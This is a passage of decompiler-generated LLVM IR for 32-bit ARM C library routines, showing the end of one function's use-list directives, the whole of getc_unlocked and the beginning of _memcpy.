  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 25, 43, 26, 27, 31, 28, 29, 30, 32, 1, 33, 34, 35, 36, 38, 37, 39, 40, 41, 42, 52, 44, 45, 53, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 11, 6, 7, 8, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 1, 7, 8, 17, 15, 16, 18, 9, 10, 19, 11, 12, 13, 20, 14, 0, 21, 22, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 10, 8, 9, 11 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 51, 18, 19, 20, 21, 22, 23, 24, 25, 50, 26, 27, 28, 29, 30, 49, 31, 32, 33, 34, 35, 36, 37, 48, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 48, 17, 18, 19, 20, 21, 22, 23, 24, 25, 47, 26, 27, 28, 29, 46, 30, 31, 32, 33, 34, 35, 36, 45, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 51, 18, 19, 20, 21, 22, 23, 24, 25, 26, 50, 27, 28, 29, 30, 49, 31, 32, 33, 34, 35, 36, 37, 48, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 17, { 13, 0, 3, 4, 1, 5, 6, 15, 14, 7, 8, 9, 2, 10, 11, 12 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6 }
  uselistorder i8 69, { 1, 0 }
  uselistorder i32 96, { 1, 2, 0 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder label %dec_label_pc_149c4, { 2, 0, 1 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %dec_label_pc_1492c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_148a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1487c, { 1, 0 }
  uselistorder label %.thread42, { 1, 0 }
  uselistorder label %dec_label_pc_14854, { 1, 0 }
  uselistorder label %dec_label_pc_14830, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14814, { 2, 1, 0 }
  uselistorder label %dec_label_pc_147e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_147e4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14708, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %dec_label_pc_146f8, { 1, 0 }
  uselistorder label %dec_label_pc_146ec, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb202, { 1, 0 }
  uselistorder label %bb200, { 1, 0 }
  uselistorder label %.preheader, { 3, 2, 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %dec_label_pc_14614, { 2, 0, 1 }
  uselistorder label %bb194, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb187, { 1, 0 }
  uselistorder label %.thread105, { 1, 0 }
  uselistorder label %bb184, { 1, 0 }
  uselistorder label %bb182, { 1, 0 }
  uselistorder label %bb180, { 1, 0 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_14a0c = load i32, i32* @r4, align 4
  store i32 %v3_14a0c, i32* %stack_var_-8, align 4
  %v0_14a10 = load i32, i32* @r0, align 4
  %v1_14a10 = add i32 %v0_14a10, 16
  %v2_14a10 = inttoptr i32 %v1_14a10 to i32*
  %v3_14a10 = load i32, i32* %v2_14a10, align 4
  store i32 %v3_14a10, i32* %r2.global-to-local, align 4
  %v1_14a14 = add i32 %v0_14a10, 24
  %v2_14a14 = inttoptr i32 %v1_14a14 to i32*
  %v3_14a14 = load i32, i32* %v2_14a14, align 4
  %v3_14a18 = icmp ult i32 %v3_14a10, %v3_14a14
  store i32 %v0_14a10, i32* @r4, align 4
  br i1 %v3_14a18, label %bb, label %dec_label_pc_14a30

bb:                                               ; preds = %entry
  %v2_14a20 = inttoptr i32 %v3_14a10 to i8*
  %v3_14a20 = load i8, i8* %v2_14a20, align 1
  %v4_14a20 = zext i8 %v3_14a20 to i32
  store i32 %v4_14a20, i32* %r0.global-to-local, align 4
  %v6_14a20 = add i32 %v3_14a10, 1
  store i32 %v6_14a20, i32* %r2.global-to-local, align 4
  store i32 %v6_14a20, i32* %v2_14a10, align 4
  br label %dec_label_pc_14b30

dec_label_pc_14a30:                               ; preds = %entry
  %v1_14a30 = inttoptr i32 %v0_14a10 to i8*
  %v2_14a30 = load i8, i8* %v1_14a30, align 1
  %v3_14a30 = zext i8 %v2_14a30 to i32
  %v1_14a34 = and i32 %v3_14a30, 131
  %tmp22 = icmp ugt i32 %v1_14a34, 128
  br i1 %tmp22, label %dec_label_pc_14a50, label %dec_label_pc_14a40

dec_label_pc_14a40:                               ; preds = %dec_label_pc_14a30
  store i32 128, i32* @r1, align 4
  %v0_14a44 = call i32 @__stdio_trans2r_o()
  store i32 %v0_14a44, i32* %r0.global-to-local, align 4
  %v2_14a48 = icmp eq i32 %v0_14a44, 0
  br i1 %v2_14a48, label %dec_label_pc_14a40.dec_label_pc_14a50_crit_edge, label %dec_label_pc_14b2c

dec_label_pc_14a40.dec_label_pc_14a50_crit_edge:  ; preds = %dec_label_pc_14a40
  %v0_14a50.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14a50

dec_label_pc_14a50:                               ; preds = %dec_label_pc_14a40.dec_label_pc_14a50_crit_edge, %dec_label_pc_14a30
  %v2_14a9c = phi i32 [ %v0_14a50.pre, %dec_label_pc_14a40.dec_label_pc_14a50_crit_edge ], [ %v0_14a10, %dec_label_pc_14a30 ]
  %v1_14a50 = inttoptr i32 %v2_14a9c to i8*
  %v2_14a50 = load i8, i8* %v1_14a50, align 1
  %v3_14a50 = zext i8 %v2_14a50 to i32
  store i32 %v3_14a50, i32* %r2.global-to-local, align 4
  %v1_14a54 = add i32 %v2_14a9c, 1
  %v2_14a54 = inttoptr i32 %v1_14a54 to i8*
  %v3_14a54 = load i8, i8* %v2_14a54, align 1
  %v4_14a54 = zext i8 %v3_14a54 to i32
  %v4_14a58 = mul nuw nsw i32 %v4_14a54, 256
  %v5_14a58 = or i32 %v4_14a58, %v3_14a50
  store i32 %v5_14a58, i32* %r2.global-to-local, align 4
  %v1_14a5c = and i32 %v3_14a50, 2
  %v2_14a5c = icmp eq i32 %v1_14a5c, 0
  br i1 %v2_14a5c, label %dec_label_pc_14a8c, label %dec_label_pc_14a64

dec_label_pc_14a64:                               ; preds = %dec_label_pc_14a50
  %tmp23 = urem i8 %v2_14a50, 2
  %v1_14a64 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_14a64
  %v4_14a68 = and i32 %tmp18, 4
  %v5_14a68 = add i32 %v4_14a68, %v2_14a9c
  %v1_14a6c = add i32 %v5_14a68, 36
  %v2_14a6c = inttoptr i32 %v1_14a6c to i8*
  %v3_14a6c = load i8, i8* %v2_14a6c, align 1
  %v4_14a6c = zext i8 %v3_14a6c to i32
  %v1_14a70 = add nsw i32 %v5_14a58, -1
  store i32 %v1_14a70, i32* %r2.global-to-local, align 4
  %v3_14a74 = sdiv i32 %v1_14a70, 256
  store i32 %v3_14a74, i32* %r1.global-to-local, align 4
  store i32 %v4_14a6c, i32* %r0.global-to-local, align 4
  %v2_14a80 = add i32 %v2_14a9c, 40
  %v3_14a80 = inttoptr i32 %v2_14a80 to i32*
  store i32 0, i32* %v3_14a80, align 4
  %v0_14a84 = load i32, i32* %r1.global-to-local, align 4
  %v1_14a84 = trunc i32 %v0_14a84 to i8
  %v2_14a84 = load i32, i32* @r4, align 4
  %v3_14a84 = add i32 %v2_14a84, 1
  %v4_14a84 = inttoptr i32 %v3_14a84 to i8*
  store i8 %v1_14a84, i8* %v4_14a84, align 1
  br label %dec_label_pc_14ac0

dec_label_pc_14a8c:                               ; preds = %dec_label_pc_14a50
  %v1_14a8c = add i32 %v2_14a9c, 16
  store i32 %v1_14a8c, i32* %r1.global-to-local, align 4
  %v1_14a90 = inttoptr i32 %v1_14a8c to i32*
  %v2_14a90 = load i32, i32* %v1_14a90, align 4
  store i32 %v2_14a90, i32* %r1.global-to-local, align 4
  %v3_14a90 = add i32 %v2_14a9c, 20
  %v4_14a90 = inttoptr i32 %v3_14a90 to i32*
  %v5_14a90 = load i32, i32* %v4_14a90, align 4
  %v9_14a94 = icmp eq i32 %v5_14a90, %v2_14a90
  br i1 %v9_14a94, label %dec_label_pc_14aa4, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_14a8c
  %v2_14a98 = inttoptr i32 %v2_14a90 to i8*
  %v3_14a98 = load i8, i8* %v2_14a98, align 1
  %v4_14a98 = zext i8 %v3_14a98 to i32
  store i32 %v4_14a98, i32* %r0.global-to-local, align 4
  %v6_14a98 = add i32 %v2_14a90, 1
  store i32 %v6_14a98, i32* %r1.global-to-local, align 4
  store i32 %v6_14a98, i32* %v1_14a90, align 4
  br label %dec_label_pc_14b30

dec_label_pc_14aa4:                               ; preds = %dec_label_pc_14a8c
  %v1_14aa4 = add i32 %v2_14a9c, 4
  %v2_14aa4 = inttoptr i32 %v1_14aa4 to i32*
  %v3_14aa4 = load i32, i32* %v2_14aa4, align 4
  %v4_14aac = icmp eq i32 %v3_14aa4, -2
  br i1 %v4_14aac, label %dec_label_pc_14ab0, label %dec_label_pc_14ac8

dec_label_pc_14ab0:                               ; preds = %dec_label_pc_14aa4
  %v1_14ab0 = or i32 %v5_14a58, 4
  store i32 %v1_14ab0, i32* %r2.global-to-local, align 4
  store i8 %v3_14a54, i8* %v2_14a54, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14ac0

dec_label_pc_14ac0:                               ; preds = %dec_label_pc_14a64, %dec_label_pc_14ab0
  %v0_14ac0 = load i32, i32* %r2.global-to-local, align 4
  %v1_14ac0 = trunc i32 %v0_14ac0 to i8
  %v2_14ac0 = load i32, i32* @r4, align 4
  %v3_14ac0 = inttoptr i32 %v2_14ac0 to i8*
  store i8 %v1_14ac0, i8* %v3_14ac0, align 1
  br label %dec_label_pc_14b30

dec_label_pc_14ac8:                               ; preds = %dec_label_pc_14aa4
  %v1_14ac8 = and i32 %v4_14a58, 768
  %v2_14ac8 = icmp eq i32 %v1_14ac8, 0
  br i1 %v2_14ac8, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_14ac8
  store i32 ptrtoint (i32** @global_var_237cc.617 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_14ac8, %bb19
  store i32 84692, i32* @lr, align 4
  %v1_14ad0 = xor i1 %v2_14ac8, true
  call void @__pseudo_cond_branch(i1 %v1_14ad0, i32 ptrtoint (i32* @global_var_113f8.858 to i32))
  %v0_14ad4 = load i32, i32* @r4, align 4
  %v1_14ad4 = add i32 %v0_14ad4, 8
  store i32 %v1_14ad4, i32* %r2.global-to-local, align 4
  %v1_14ad8 = inttoptr i32 %v1_14ad4 to i32*
  %v2_14ad8 = load i32, i32* %v1_14ad8, align 4
  store i32 %v2_14ad8, i32* %r2.global-to-local, align 4
  %v3_14ad8 = add i32 %v0_14ad4, 12
  %v4_14ad8 = inttoptr i32 %v3_14ad8 to i32*
  %v5_14ad8 = load i32, i32* %v4_14ad8, align 4
  %v9_14adc = icmp eq i32 %v5_14ad8, %v2_14ad8
  br i1 %v9_14adc, label %dec_label_pc_14b10, label %dec_label_pc_14ae4

dec_label_pc_14ae4:                               ; preds = %bb20
  %v2_14ae4 = add i32 %v0_14ad4, 24
  %v3_14ae4 = inttoptr i32 %v2_14ae4 to i32*
  store i32 %v2_14ad8, i32* %v3_14ae4, align 4
  %v0_14ae8 = load i32, i32* @r4, align 4
  store i32 %v0_14ae8, i32* %r0.global-to-local, align 4
  %v2_14aec = call i32 @__stdio_rfill(i32 %v0_14ae8)
  store i32 %v2_14aec, i32* %r0.global-to-local, align 4
  %v2_14af0 = icmp eq i32 %v2_14aec, 0
  br i1 %v2_14af0, label %dec_label_pc_14b2c, label %dec_label_pc_14af8

dec_label_pc_14af8:                               ; preds = %dec_label_pc_14ae4
  %v0_14af8 = load i32, i32* @r4, align 4
  %v1_14af8 = add i32 %v0_14af8, 20
  %v2_14af8 = inttoptr i32 %v1_14af8 to i32*
  %v3_14af8 = load i32, i32* %v2_14af8, align 4
  %v2_14afc = add i32 %v0_14af8, 24
  %v3_14afc = inttoptr i32 %v2_14afc to i32*
  store i32 %v3_14af8, i32* %v3_14afc, align 4
  %v0_14b00 = load i32, i32* @r4, align 4
  %v1_14b00 = add i32 %v0_14b00, 16
  %v2_14b00 = inttoptr i32 %v1_14b00 to i32*
  %v3_14b00 = load i32, i32* %v2_14b00, align 4
  %v1_14b04 = inttoptr i32 %v3_14b00 to i8*
  %v2_14b04 = load i8, i8* %v1_14b04, align 1
  %v3_14b04 = zext i8 %v2_14b04 to i32
  store i32 %v3_14b04, i32* %r0.global-to-local, align 4
  %v5_14b04 = add i32 %v3_14b00, 1
  store i32 %v5_14b04, i32* %v2_14b00, align 4
  br label %dec_label_pc_14b30

dec_label_pc_14b10:                               ; preds = %bb20
  %v1_14b10 = inttoptr i32 %v0_14ad4 to i8*
  store i32 %v0_14ad4, i32* %r0.global-to-local, align 4
  %v2_14b14 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_14b14, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_14b1c = call i32 @__stdio_READ(i8* %v1_14b10, i32 %v2_14b14, i32 1)
  store i32 %v5_14b1c, i32* %r0.global-to-local, align 4
  %v2_14b20 = icmp eq i32 %v5_14b1c, 0
  br i1 %v2_14b20, label %dec_label_pc_14b2c, label %bb21

bb21:                                             ; preds = %dec_label_pc_14b10
  %v4_14b24 = load i8, i8* %stack_var_-9, align 1
  %v5_14b24 = sext i8 %v4_14b24 to i32
  store i32 %v5_14b24, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14b30

dec_label_pc_14b2c:                               ; preds = %dec_label_pc_14b10, %dec_label_pc_14a40, %dec_label_pc_14ae4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14b30

dec_label_pc_14b30:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_14af8, %dec_label_pc_14ac0, %dec_label_pc_14b2c
  %v2_14b34 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b34, i32* @r4, align 4
  %v8_14b34 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_14b34

; uselistorder directives
  uselistorder i32 %v2_14a90, { 1, 0, 2, 3 }
  uselistorder i32 %v3_14a50, { 1, 0, 2 }
  uselistorder i32 %v2_14a9c, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_14a10, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i8** @global_var_23804.584, { 2, 1, 0 }
  uselistorder i32** @global_var_237cc.617, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14b30, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_14b2c, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_14ac0, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_14b40 = load i32, i32* @r1, align 4
  %v1_14b40 = load i32, i32* %r0.global-to-local, align 4
  %v2_14b40 = sub i32 %v0_14b40, %v1_14b40
  %v3_14b40 = icmp ult i32 %v0_14b40, %v1_14b40
  %v4_14b40 = xor i32 %v1_14b40, %v0_14b40
  %v5_14b40 = xor i32 %v2_14b40, %v0_14b40
  %v6_14b40 = and i32 %v5_14b40, %v4_14b40
  %v7_14b40 = icmp slt i32 %v6_14b40, 0
  store i1 %v7_14b40, i1* %cpsr_v.global-to-local, align 1
  %v8_14b40 = icmp slt i32 %v2_14b40, 0
  store i1 %v8_14b40, i1* %cpsr_n.global-to-local, align 1
  %v9_14b40 = icmp eq i32 %v0_14b40, %v1_14b40
  store i1 %v9_14b40, i1* @cpsr_z, align 1
  br i1 %v3_14b40, label %dec_label_pc_14d8c, label %dec_label_pc_14b48

dec_label_pc_14b48:                               ; preds = %entry
  br i1 %v9_14b40, label %.thread123, label %bb

.thread123:                                       ; preds = %bb146, %.thread122, %bb143, %dec_label_pc_14b48
  %merge = phi i32 [ %v0_14b40, %dec_label_pc_14b48 ], [ %v2_14e20, %bb143 ], [ %v11_14e3c, %bb146 ], [ %v7_14e3c, %.thread122 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_14b48
  %v5_14b4c = inttoptr i32 %v1_14b40 to i8*
  store i8* %v5_14b4c, i8** %stack_var_-8, align 4
  %v0_14b50 = load i32, i32* @r2, align 4
  %v2_14b50 = add i32 %v0_14b50, -4
  store i32 %v2_14b50, i32* %r2.global-to-local, align 4
  %v4_14b50 = sub i32 3, %v0_14b50
  %v5_14b50 = and i32 %v4_14b50, %v0_14b50
  %v6_14b50 = icmp slt i32 %v5_14b50, 0
  store i1 %v6_14b50, i1* %cpsr_v.global-to-local, align 1
  %v7_14b50 = icmp slt i32 %v2_14b50, 0
  store i1 %v7_14b50, i1* %cpsr_n.global-to-local, align 1
  %v5_14b54 = icmp slt i32 %v0_14b50, 4
  br i1 %v5_14b54, label %bb133, label %dec_label_pc_14b58

dec_label_pc_14b58:                               ; preds = %bb
  %v1_14b58 = urem i32 %v1_14b40, 4
  store i32 %v1_14b58, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14b58 = icmp eq i32 %v1_14b58, 0
  br i1 %v2_14b58, label %dec_label_pc_14b60, label %dec_label_pc_14c04

dec_label_pc_14b60:                               ; preds = %dec_label_pc_14b58
  %v1_14b60 = urem i32 %v0_14b40, 4
  store i32 %v1_14b60, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14b60 = icmp eq i32 %v1_14b60, 0
  %extract.t = trunc i32 %v0_14b40 to i2
  br i1 %v2_14b60, label %dec_label_pc_14b68, label %dec_label_pc_14c34

dec_label_pc_14b68:                               ; preds = %dec_label_pc_14b60, %dec_label_pc_14c2c
  %v0_14b8093 = phi i32 [ %v1_14b40, %dec_label_pc_14b60 ], [ %v0_14c7c76, %dec_label_pc_14c2c ]
  %v0_14b7c92 = phi i32 [ %v0_14b40, %dec_label_pc_14b60 ], [ %v0_14c2c, %dec_label_pc_14c2c ]
  %v0_14b68 = phi i32 [ %v2_14b50, %dec_label_pc_14b60 ], [ %v2_14c24, %dec_label_pc_14c2c ]
  %v2_14b68 = add i32 %v0_14b68, -8
  store i32 %v2_14b68, i32* %r2.global-to-local, align 4
  %v4_14b68 = sub i32 7, %v0_14b68
  %v5_14b68 = and i32 %v4_14b68, %v0_14b68
  %v6_14b68 = icmp slt i32 %v5_14b68, 0
  store i1 %v6_14b68, i1* %cpsr_v.global-to-local, align 1
  %v7_14b68 = icmp slt i32 %v2_14b68, 0
  store i1 %v7_14b68, i1* %cpsr_n.global-to-local, align 1
  %v5_14b6c = icmp slt i32 %v0_14b68, 8
  br i1 %v5_14b6c, label %dec_label_pc_14bbc, label %dec_label_pc_14b70

dec_label_pc_14b70:                               ; preds = %dec_label_pc_14b68
  %v2_14b70 = add i32 %v0_14b68, -28
  store i32 %v2_14b70, i32* %r2.global-to-local, align 4
  %v4_14b70 = sub i32 27, %v0_14b68
  %v5_14b70 = and i32 %v4_14b70, %v2_14b68
  %v6_14b70 = icmp slt i32 %v5_14b70, 0
  store i1 %v6_14b70, i1* %cpsr_v.global-to-local, align 1
  %v7_14b70 = icmp slt i32 %v2_14b70, 0
  store i1 %v7_14b70, i1* %cpsr_n.global-to-local, align 1
  %v5_14b74 = icmp slt i32 %v2_14b68, 20
  br i1 %v5_14b74, label %dec_label_pc_14ba8, label %dec_label_pc_14b78

dec_label_pc_14b78:                               ; preds = %dec_label_pc_14b70
  %v0_14b78 = load i32, i32* @r4, align 4
  store i32 %v0_14b78, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14b7c

dec_label_pc_14b7c:                               ; preds = %dec_label_pc_14b7c.dec_label_pc_14b7c_crit_edge, %dec_label_pc_14b78
  %v0_14b80 = phi i32 [ %v12_14b88, %dec_label_pc_14b7c.dec_label_pc_14b7c_crit_edge ], [ %v0_14b8093, %dec_label_pc_14b78 ]
  %v0_14b7c = phi i32 [ %v0_14b7c.pre, %dec_label_pc_14b7c.dec_label_pc_14b7c_crit_edge ], [ %v0_14b7c92, %dec_label_pc_14b78 ]
  %v1_14b7c = inttoptr i32 %v0_14b7c to i32*
  %v2_14b7c = load i32, i32* %v1_14b7c, align 4
  store i32 %v2_14b7c, i32* %r3.global-to-local, align 4
  %v3_14b7c = add i32 %v0_14b7c, 4
  %v4_14b7c = inttoptr i32 %v3_14b7c to i32*
  %v5_14b7c = load i32, i32* %v4_14b7c, align 4
  store i32 %v5_14b7c, i32* %r4.global-to-local, align 4
  %v6_14b7c = add i32 %v0_14b7c, 8
  %v7_14b7c = inttoptr i32 %v6_14b7c to i32*
  %v8_14b7c = load i32, i32* %v7_14b7c, align 4
  store i32 %v8_14b7c, i32* %ip.global-to-local, align 4
  %v9_14b7c = add i32 %v0_14b7c, 12
  %v10_14b7c = inttoptr i32 %v9_14b7c to i32*
  %v11_14b7c = load i32, i32* %v10_14b7c, align 4
  store i32 %v11_14b7c, i32* %lr.global-to-local, align 4
  %v12_14b7c = add i32 %v0_14b7c, 16
  store i32 %v12_14b7c, i32* %r1.global-to-local, align 4
  %v1_14b80 = inttoptr i32 %v0_14b80 to i32*
  store i32 %v2_14b7c, i32* %v1_14b80, align 4
  %v3_14b80 = add i32 %v0_14b80, 4
  %v4_14b80 = inttoptr i32 %v3_14b80 to i32*
  %v5_14b80 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14b80, i32* %v4_14b80, align 4
  %v6_14b80 = add i32 %v0_14b80, 8
  %v7_14b80 = inttoptr i32 %v6_14b80 to i32*
  %v8_14b80 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_14b80, i32* %v7_14b80, align 4
  %v9_14b80 = add i32 %v0_14b80, 12
  %v10_14b80 = inttoptr i32 %v9_14b80 to i32*
  %v11_14b80 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_14b80, i32* %v10_14b80, align 4
  %v12_14b80 = add i32 %v0_14b80, 16
  store i32 %v12_14b80, i32* %r0.global-to-local, align 4
  %v0_14b84 = load i32, i32* %r1.global-to-local, align 4
  %v1_14b84 = inttoptr i32 %v0_14b84 to i32*
  %v2_14b84 = load i32, i32* %v1_14b84, align 4
  store i32 %v2_14b84, i32* %r3.global-to-local, align 4
  %v3_14b84 = add i32 %v0_14b84, 4
  %v4_14b84 = inttoptr i32 %v3_14b84 to i32*
  %v5_14b84 = load i32, i32* %v4_14b84, align 4
  store i32 %v5_14b84, i32* %r4.global-to-local, align 4
  %v6_14b84 = add i32 %v0_14b84, 8
  %v7_14b84 = inttoptr i32 %v6_14b84 to i32*
  %v8_14b84 = load i32, i32* %v7_14b84, align 4
  store i32 %v8_14b84, i32* @ip, align 4
  %v9_14b84 = add i32 %v0_14b84, 12
  %v10_14b84 = inttoptr i32 %v9_14b84 to i32*
  %v11_14b84 = load i32, i32* %v10_14b84, align 4
  store i32 %v11_14b84, i32* @lr, align 4
  %v12_14b84 = add i32 %v0_14b84, 16
  store i32 %v12_14b84, i32* @r1, align 4
  %v1_14b88 = inttoptr i32 %v12_14b80 to i32*
  store i32 %v2_14b84, i32* %v1_14b88, align 4
  %v3_14b88 = add i32 %v0_14b80, 20
  %v4_14b88 = inttoptr i32 %v3_14b88 to i32*
  %v5_14b88 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14b88, i32* %v4_14b88, align 4
  %v6_14b88 = add i32 %v0_14b80, 24
  %v7_14b88 = inttoptr i32 %v6_14b88 to i32*
  %v8_14b88 = load i32, i32* @ip, align 4
  store i32 %v8_14b88, i32* %v7_14b88, align 4
  %v9_14b88 = add i32 %v0_14b80, 28
  %v10_14b88 = inttoptr i32 %v9_14b88 to i32*
  %v11_14b88 = load i32, i32* @lr, align 4
  store i32 %v11_14b88, i32* %v10_14b88, align 4
  %v12_14b88 = add i32 %v0_14b80, 32
  store i32 %v12_14b88, i32* %r0.global-to-local, align 4
  %v0_14b8c = load i32, i32* %r2.global-to-local, align 4
  %v2_14b8c = add i32 %v0_14b8c, -32
  store i32 %v2_14b8c, i32* %r2.global-to-local, align 4
  %v6_14b90 = icmp slt i32 %v0_14b8c, 32
  br i1 %v6_14b90, label %dec_label_pc_14b94, label %dec_label_pc_14b7c.dec_label_pc_14b7c_crit_edge

dec_label_pc_14b7c.dec_label_pc_14b7c_crit_edge:  ; preds = %dec_label_pc_14b7c
  %v0_14b7c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14b7c

dec_label_pc_14b94:                               ; preds = %dec_label_pc_14b7c
  %v4_14b94 = add i32 %v0_14b8c, -16
  %v6_14b94 = add i32 %v0_14b8c, 2147483616
  %v7_14b94 = and i32 %v4_14b94, %v6_14b94
  %v8_14b94 = icmp slt i32 %v7_14b94, 0
  store i1 %v8_14b94, i1* %cpsr_v.global-to-local, align 1
  %v9_14b94 = icmp slt i32 %v4_14b94, 0
  store i1 %v9_14b94, i1* %cpsr_n.global-to-local, align 1
  %v5_14b98 = icmp slt i32 %v2_14b8c, -16
  br i1 %v5_14b98, label %.thread2, label %bb130

bb130:                                            ; preds = %dec_label_pc_14b94
  %v6_14b98 = load i32, i32* @r1, align 4
  %v7_14b98 = inttoptr i32 %v6_14b98 to i32*
  %v8_14b98 = load i32, i32* %v7_14b98, align 4
  store i32 %v8_14b98, i32* %r3.global-to-local, align 4
  %v9_14b98 = add i32 %v6_14b98, 4
  %v10_14b98 = inttoptr i32 %v9_14b98 to i32*
  %v11_14b98 = load i32, i32* %v10_14b98, align 4
  store i32 %v11_14b98, i32* %r4.global-to-local, align 4
  %v12_14b98 = add i32 %v6_14b98, 8
  %v13_14b98 = inttoptr i32 %v12_14b98 to i32*
  %v14_14b98 = load i32, i32* %v13_14b98, align 4
  store i32 %v14_14b98, i32* @ip, align 4
  %v15_14b98 = add i32 %v6_14b98, 12
  %v16_14b98 = inttoptr i32 %v15_14b98 to i32*
  %v17_14b98 = load i32, i32* %v16_14b98, align 4
  store i32 %v17_14b98, i32* @lr, align 4
  %v18_14b98 = add i32 %v6_14b98, 16
  store i32 %v18_14b98, i32* @r1, align 4
  %v7_14b9c = inttoptr i32 %v12_14b88 to i32*
  store i32 %v8_14b98, i32* %v7_14b9c, align 4
  %v9_14b9c = add i32 %v0_14b80, 36
  %v10_14b9c = inttoptr i32 %v9_14b9c to i32*
  %v11_14b9c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_14b9c, i32* %v10_14b9c, align 4
  %v12_14b9c = add i32 %v0_14b80, 40
  %v13_14b9c = inttoptr i32 %v12_14b9c to i32*
  %v14_14b9c = load i32, i32* @ip, align 4
  store i32 %v14_14b9c, i32* %v13_14b9c, align 4
  %v15_14b9c = add i32 %v0_14b80, 44
  %v16_14b9c = inttoptr i32 %v15_14b9c to i32*
  %v17_14b9c = load i32, i32* @lr, align 4
  store i32 %v17_14b9c, i32* %v16_14b9c, align 4
